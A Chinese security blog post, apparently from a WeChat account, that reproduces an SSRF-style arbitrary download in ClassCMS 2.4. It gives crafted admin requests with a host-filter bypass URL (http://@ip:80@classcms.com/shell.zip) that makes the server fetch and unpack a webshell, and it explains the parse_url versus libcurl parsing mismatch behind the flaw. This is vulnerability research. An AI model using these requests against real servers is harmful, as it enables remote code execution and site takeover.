<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1pP5--SXsYLUXkXFREH3Ag)

获网安教程

免费 & 进群

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

本文由掌控安全学院 - 子羽投稿

*   ClassCMS2.4 漏洞复现
    

*   环境搭建
    
*   任意文件下载漏洞复现
    
*   漏洞成因
    

ClassCMS2.4 漏洞复现
================

CMS 源码在附件中

环境搭建
----

使用 phpstudy2016 搭建 web 环境，php 版本为 5.5  
安装 CMS  
这里选择 Mysql 数据库进行安装  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJicObssZTibGoWqJicpjN5A56aBSvtkmqlAn6UfdC9qroD0uPFvTIOpicyQ/640?wx_fmt=png)

> 用户名和密码都写默认的 admin 方便记忆  
> 输入完成后点击安装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJafFyUcgovmVljGAenapgh3s6Y5hU3y7ibib8Vl3pAMgce8eoCicHyLLLA/640?wx_fmt=png)  
点击安装  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJTP508Ric2OeNhdNhVb2Vic4mq25QXl95nK68QasXFHicPW0opGunZE2eA/640?wx_fmt=png)

> CMS 的安装过程中有个报错忽略就好，登录不进后台的话刷新一下页面

进入了 ClassCMS 的后台  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJbkO7NA0KJmxPNfmhfhLvgoORd3ibfS5kQc26icQeFNeYGfTx65wN7KTQ/640?wx_fmt=png)

任意文件下载漏洞复现
----------

在后台访问应用商店  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJojHM1fia36mehJOEzOHpqPpg9jSfJBoGGPUfmQdicc58riaZ6oR79iaQDA/640?wx_fmt=png)  
任意点击一个下载  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJRoIE1TK9Qm4UgrkX5LsibhtVhlNAWBj8eBKfRMFUJLyGTapCluY6B7Q/640?wx_fmt=png)  
进入下载页面后点击 下载 进行抓包  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJ5J1dDwHL7xyOa0vvLdAs3Pibusib76mLoZNJvKxvICm9PVImGXNI7ggw/640?wx_fmt=png)  
我们先放掉第一个包  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJcOJq9xNj0TrmzfYGAK6YXc6J7Y3nLzlChJrgv2ibCRMlkLByAVltDFw/640?wx_fmt=png)

```
POST /admin?do=shop:index&ajax=1&action=fileurl&from=install HTTP/1.1
Host: 192.168.12.144
Content-Length: 47
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.12.144
Referer: http://192.168.12.144/admin?do=shop:index&bread=%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3&action=detail&classhash=debugswitch
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: token_9a9fe8=e0c7aacedb82db0c1522667cbf0bc806; csrf_9a9fe8=b472e230
Connection: close
classhash=debugswitch&version=1.0&csrf=b472e230

```

然后修改第二个请求包  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJ9nSyKqxw673J9nUOuBbBK1pNoiaOAc9heJWEKQovjO59iaUJjIWmf4bA/640?wx_fmt=png)

```
//第二个数据包
POST /admin666?do=shop:downloadClass&ajax=1 HTTP/1.1
Host: classcms
Content-Length: 85
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.159.1
Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&action=detail&classhash=classcreate
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=338ceb00
Connection: close
classhash={dir}&url=http://@{ip}:{port}@classcms.com/{shell.zip}&csrf=b472e230

```

数据包参数解析

```
classhash为解压出来的最后文件名
url为了绕过过滤设成如下形式
http://@ip:80@classcms.com/shell.zip
远程ip端口（默认80也需要加上），一个包含木马文件（shell.php）的zip压缩包
csrf参数不动即可
发送之后返回:下载完成
就说明已经成功被下载到目标服务器上并解压
最后访问url即可执行上传上的木马getshell
http://ip/class/{classhash的值}/{上传压缩包中的木马文件}

```

我们安装上面的格式修改数据包上传一个木马文件

先在网站根目录创建一个木马文件，然后把他压缩成压缩包  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJmbvvDicbu5FDqIOu7iaG1H3A3cTLn0cho3XEZvsLlAByROLKaftfYRsw/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJFB46MhwibeYqtOdibwxicaPIFqKuUxm2XnsggEeUiac4k2jx4U1rx5REdA/640?wx_fmt=png)

然后再重新构建第二个数据包

```
//第二个数据包
POST /admin666?do=shop:downloadClass&ajax=1 HTTP/1.1
Host: classcms
Content-Length: 85
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.159.1
Referer: http://192.168.159.1/ClassCMS/admin666?do=shop:index&bread=%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91&action=detail&classhash=classcreate
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: token_2ab421=5d012ca838cc5f0aff02c44c8e2c91e7; csrf_2ab421=b472e230
Connection: close
classhash=shell&url=http://@192.168.12.144:80@classcms.com/shell.zip&csrf=338ceb00

```

上传之前创建的 shell.zip  
`classhash=shell&url=http://@192.168.12.144:80@classcms.com/shell.zip&csrf=b472e230`  
直接修改数据包后放包也可以  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJrp46Z46N2Bic4lO0GQOv2kgro6WGAInHU3ooJXbSAKk3x3Mh9TOcAgw/640?wx_fmt=png)  
把修改后的数据包提交  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJrbmarY6A7eU10KQI0ticZXmny1quibib2ZJYZvfSm05NubA95ia727iaqPw/640?wx_fmt=png)  
提交成功  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJkRZMr8dEhbjwE6LmCJEMywnZibBh8PxLVAulQaGJuPpS4rmgpRU69xA/640?wx_fmt=png)

访问`http://192.168.12.144/class/shell/shell.php`  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJics5cVibukESW0icMeuqMPgvoQTVONuQYvFncoqRCDF8vjUBnxmjsvGEQ/640?wx_fmt=png)  
可以看到木马上传成功了，在本地也可以看到下载的 shell.zip 文件  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJJAnzZWtLTf41zDOJ7olXJHZHyF3Tib9oOgka2gibPHCeQjwxOXkeD9IA/640?wx_fmt=png)

漏洞成因
----

经白盒测试发现在 / class/shop/shop.php 中  
通过全局搜索，“下载完成” 定位到此处  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJC2kKtWjb5kIlvyMkM57SIGr6a6QKVZIdluuUe6khiaCHpNab24BC7Ug/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJ8K4hiaTlLn5qH4zzKicKW4v9y2upUA21vicA9fBt9QowT6Gn74J2bHYXg/640?wx_fmt=png)  
一处为在`downloadClass`函数中一处在`upgradeClass`函数中，观察功能显然是在`downloadClass`中  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJpq9O9WdX7PgRSgaFX9P8F91Sgibiaice1CW9DmIj4YYG4Mzx6skibiaGQrQ/640?wx_fmt=png)  
在`this(当前文件shop.php)->download`函数下, 定位到关键函数`download`  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJywNSic0NlUPHJRdjcicEtdgUGRIV8TD0Xb8kiaXibbpLO1U1YNuWlibA8HA/640?wx_fmt=png)  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJvuKgxpoRW8aLkZNVLDiaFbQs6ic90KaSUt9CN9iavDwQTfSNvWWDnkgOw/640?wx_fmt=png)  
函数首先获取了默认允许的`host`，在`this(前文件下)->defaultHost`函数中  
定位函数 defaultHost

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJcA9nJOHXFPvdJt9mQosBf4nDVnCFtaUlNNs2rG3Aa0VYtsQOUyfmfQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/BwqHlJ29vcrXT3wic40yZrAy9yxuMGuqJKJbYH274XYLwzOdOXkIooNR2SRmVOCFWXNKBTb3cI4KiaUB876mCZgQ/640?wx_fmt=png)  
只允许 classcms.com;classcms.uuu.la  
然后将我们传入的 url (这里是`http://http://192.168.12.144/shell.zip`) 通过 parse_url 函数解析后在判断是否是在数组中  
我们的攻击 url 也就是 down 在了这里，那么目标就是绕过这个判断然后执行接下来的 curl 命令

```
if(!isset($checkurl['host']) || !in_array($checkurl['host'],$hosts)) {
    Return false;        
}

```

前一个条件存在是肯定满足的，那么只需要让经过 parse_url 解析过的 host 键值和数组相等即可

这里利用 php 中的 parse_url 函数和 lib_curl 对 url 的解析差异, 导致了对 host 的过滤失效来进行绕过

php-curl 拓展解析的 url host 在第首个 @之后  
而 parse_url 则是最后一个 @之后  
所以构造处 payload

`http://@http://192.168.12.144:80@classcms.com/shell.zip`

申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，

所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)  

**没看够~？欢迎关注！**

**分享本文到朋友圈，可以凭截图找老师领取**

上千**教程 + 工具 + 交流群 + 靶场账号**哦

![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcphoiceCnjmUWFfEhzNhfgO7iaV9R1C73m3H1q8jd45xJl4GH5ARr4yJ5lqeZuyZ7kd8UEMy2RQJUOA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

 **分享后扫码加我！**

  

**回顾往期内容**

[Xray 挂机刷漏洞](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247504665&idx=1&sn=eb88ca9711e95ee8851eb47959ff8a61&chksm=fa6baa68cd1c237e755037f35c6f74b3c09c92fd2373d9c07f98697ea723797b73009e872014&scene=21#wechat_redirect)  

[零基础学黑客，该怎么学？](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487576&idx=1&sn=3852f2221f6d1a492b94939f5f398034&chksm=fa686929cd1fe03fcb6d14a5a9d86c2ed750b3617bd55ad73134bd6d1397cc3ccf4a1b822bd4&scene=21#wechat_redirect)

[网络安全人员必考的几本证书！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247520349&idx=1&sn=41b1bcd357e4178ba478e164ae531626&chksm=fa6be92ccd1c603af2d9100348600db5ed5a2284e82fd2b370e00b1138731b3cac5f83a3a542&scene=21#wechat_redirect)  

[文库｜内网神器 cs4.0 使用说明书](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247519540&idx=1&sn=e8246a12895a32b4fc2909a0874faac2&chksm=fa6bf445cd1c7d53a207200289fe15a8518cd1eb0cc18535222ea01ac51c3e22706f63f20251&scene=21#wechat_redirect)  

[代码审计 | 这个 CNVD 证书拿的有点轻松](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503150&idx=1&sn=189d061e1f7c14812e491b6b7c49b202&chksm=fa6bb45fcd1c3d490cdfa59326801ecb383b1bf9586f51305ad5add9dec163e78af58a9874d2&scene=21#wechat_redirect)

[【精选】SRC 快速入门 + 上分小秘籍 + 实战指南](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247512593&idx=1&sn=24c8e51745added4f81aa1e337fc8a1a&chksm=fa6bcb60cd1c4276d9d21ebaa7cb4c0c8c562e54fe8742c87e62343c00a1283c9eb3ea1c67dc&scene=21#wechat_redirect)

 [代理池工具撰写 | 只有无尽的跳转，没有封禁的 IP！](http://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247503462&idx=1&sn=0b696f0cabab0a046385599a1683dfb2&chksm=fa6bb717cd1c3e01afc0d6126ea141bb9a39bf3b4123462528d37fb00f74ea525b83e948bc80&scene=21#wechat_redirect)
-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1)

点赞 + 在看支持一下吧~ 感谢看官老爷~ 

你的点赞是我更新的动力